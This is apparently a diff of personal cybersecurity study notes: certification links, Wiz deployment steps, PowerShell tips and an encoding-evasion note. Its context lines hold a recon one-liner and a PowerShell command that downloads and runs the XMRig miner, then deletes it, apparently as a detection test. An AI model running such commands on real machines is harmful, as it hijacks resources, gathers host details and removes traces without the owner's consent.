@@ -98,3 +98,30 @@ powershell -c "whoami; hostname; netsh advfirewall show allprofiles state; qwins
 powershell -c "$u=\"https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip\";$z=\"$env:TEMP\\xmrig.zip\";$e=\"$env:TEMP\\ExtractedXMRig\\\";Invoke-WebRequest $u -OutFile $z; if(Test-Path $e){Remove-Item $e -Recurse -Force}; Expand-Archive $z $e; $p=Start-Process (Join-Path $e \"xmrig-6.24.0\\xmrig\") -ArgumentList \"--url=stratum+tcp://donate.v2.xmrig.com:3333\" -PassThru; Start-Sleep 5; Stop-Process $p.Id -Force; Start-Sleep 2;Remove-Item -Path $e -Recurse -Force;Remove-Item -Path $z"
 
 Review Results
+
+@@@@@@@@@@@@@
+Browse.ai   AI to scrap the web .. just enter URL.. https://www.youtube.com/@NetNinja    for GraphQL and Claude Code masterclass tips NEED ALONG WITH NODEJS building GRAPHQL server steps and frameworks 
+https://docs.wiz.us/dev/vulnerability-finding API is JSON with FUNCTIONS that will PULL FROM SCHEMA AND Dynamic to PASS a VARIALBE .. so create a QUERY on top that calls variables that will be passed .. 
+Hackthebox.com https://www.youtube.com/watch?v=fu71CljrxsU   YARA classify Malware .. Huntmon-main + Procmon64   regshot  Tor   HuntressInstaller  all john desktop 
+https://www.youtube.com/@mosseinstitute
+https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+https://registry.terraform.io/providers/sullivtr/graphql/latest/docs 
+https://www.youtube.com/watch?v=P4xmask-N2M   for Terraform add
+%2529: Double-encoded closing parenthesis ) (Original: ) \(\rightarrow \) %29 \(\rightarrow \) %2529).
+
+Invoke-restMethod   vs invoke-web   Using RestMethod is a wrapper that provides clean output $Rest = invoke-RestMethod      if .---> $rest.info   and $rest.results Vs invoke -webrequest   returns a JSON with all HEADER URL output invoke-webrequest.content | convertfrom-Json used API site https://randomuser.me/api 
+Bash + Terraform + Manual   … AWS has Cloudformation (launchCloudformation exits) Terraform (will provide main.tf file)  Manual Management Group + Subscription +  Entra Only Organization   orAccount curl -fsSL https://wizio-public-fedramp.s3-us-gov-west-1.amazonaws.com/deployment-v3/azure/cli/2635/wiz-azure.sh-o wiz-azure.sh &&chmod +x wiz-azure.sh && ./wiz-azure.sh standardmanagement-group-deployment --with-serverless-scanning --with-data-scanning--with-shadow-data --with-openai-scanning--wiz-managed-id=cb99039b-36ce-4436-a42c-c0d7eba08acb --with-aad-consent https://wizio-public-fedramp.s3-us-gov-west-1.amazonaws.com/deployment-v3/azure/cli/2635/wiz-azure.shhttps://www.azadvertizer.net/azrolesadvertizer/189207d4-bb67-4208-a635-b06afe8b2c57.htmlMicrosoft.Sql/servers/databases/write
+
+Free Automated Malware Analysis Service - powered by Falcon Sandbox
+
+https://errors.edgesuite.net/97.186adc17.1777245112.88e452c  for Ebay 
+Data is no longer information it represents influence.    As and only if true and not biased and not questioned 
+PowerAutomate in URL for Teams Flow in MS Teams Power App and DataVerse CipChamp video editor 
+
+
+https://learn.microsoft.com/en-us/credentials/certifications/exams/sc-100/    or Cybersecurity Architect but will need another exam to get the cert SC 200 or 300 to get Expert label.. ie Cybersecurity Architext Expert https://learn.microsoft.com/en-us/shows/exam-readiness-zone/preparing-for-sc-100-design-solutions-that-align-with-security-best-practices-and-priorities  revisit for PREP on DOMAINs Topics covered on exam + Insights for preparing for exam + Determine concepts to priortize/revist for studying or wording in my case. Essential Strategies for and preparations so will got go over concepts but will cover tips and tricks 
+
+https://learn.microsoft.com/en-us/credentials/certifications/security-operations-analyst/?practice-assessment-type=certification  for SC-200
+
+https://www.cisa.gov/news-events/directives/bod-26-04-implementation-guidance-prioritizing-security-updates-based-risk  
+Implementing SaaS Security Guideline  wrt CISA Pillars for laying rule for SaaS and secruity but transparency 
